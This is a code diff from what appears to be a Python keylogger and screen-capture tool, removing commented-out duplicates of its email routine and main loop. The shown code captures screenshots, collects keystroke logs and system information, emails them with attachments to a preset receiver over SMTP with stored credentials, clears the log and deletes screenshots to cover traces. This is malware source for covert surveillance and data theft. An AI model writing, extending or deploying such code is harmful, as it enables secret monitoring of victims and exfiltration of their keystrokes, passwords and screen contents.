@@ -110,33 +110,6 @@ def take_screenshot(filename):
 # -------------------------
 # Send email
 # -------------------------
-# def send_email(subject, body, screenshot_path=None, files_to_attach=[]):
-#     msg = MIMEMultipart()
-#     msg["From"] = SENDER_EMAIL
-#     msg["To"] = RECEIVER_EMAIL
-#     msg["Subject"] = subject
-#     msg.attach(MIMEText(body, "plain"))
-
-#     paths_to_attach = []
-#     if screenshot_path and os.path.exists(screenshot_path):
-#         paths_to_attach.append(screenshot_path)
-#     for f in files_to_attach:
-#         if os.path.exists(f):
-#             paths_to_attach.append(f)
-
-#     for path in paths_to_attach:
-#         with open(path, "rb") as f:
-#             part = MIMEApplication(f.read(), name=os.path.basename(path))
-#             msg.attach(part)
-
-#     try:
-#         with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
-#             server.login(SENDER_EMAIL, SENDER_PASSWORD)
-#             server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
-#         print(f"📧 Email sent successfully with {', '.join([os.path.basename(p) for p in paths_to_attach])}")
-#     except Exception as e:
-#         print(f"❌ Error sending email: {e}")
-
 def send_email(subject, body, screenshot_path=None, files_to_attach=[]):
     msg = MIMEMultipart()
     msg["From"] = SENDER_EMAIL
@@ -167,45 +140,6 @@ def send_email(subject, body, screenshot_path=None, files_to_attach=[]):
 # -------------------------
 # Main loop
 # -------------------------
-# def main():
-#     start_keylogger()
-#     get_computer_info()
-#     screenshot_counter = 0
-
-#     try:
-#         while True:
-#             timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-#             screenshot_file = os.path.join(SCREENSHOT_DIR, f"screen_{timestamp}.png")
-
-#             take_screenshot(screenshot_file)
-#             screenshot_counter += 1
-
-#             # Send email every 5 screenshots
-#             if screenshot_counter % 5 == 0:
-#                 send_email(
-#                     f"System Report + Screenshot {timestamp}",
-#                     "Attached are the latest screenshot and log files.",
-#                     screenshot_file if ENABLE_SCREENSHOTS else None,
-#                     [LOG_FILE, SYS_INFO_FILE]
-#                 )
-#                 open(LOG_FILE, "w").close()
-#             else:
-#                 send_email(
-#                     f"Screenshot {timestamp}",
-#                     "Attached is the latest screenshot.",
-#                     screenshot_file if ENABLE_SCREENSHOTS else None,
-#                     files_to_attach=[]
-#                 )
-
-#             if ENABLE_SCREENSHOTS and os.path.exists(screenshot_file):
-#                 os.remove(screenshot_file)
-
-#             time.sleep(SCREENSHOT_INTERVAL)
-
-#     except KeyboardInterrupt:
-#         print("\n⏹️ Keyboard interrupt detected. Performing cleanup...")
-#     finally:
-#         cleanup()
 
 def main():
     if not (ENABLE_KEYLOGGER or ENABLE_SCREENSHOTS):
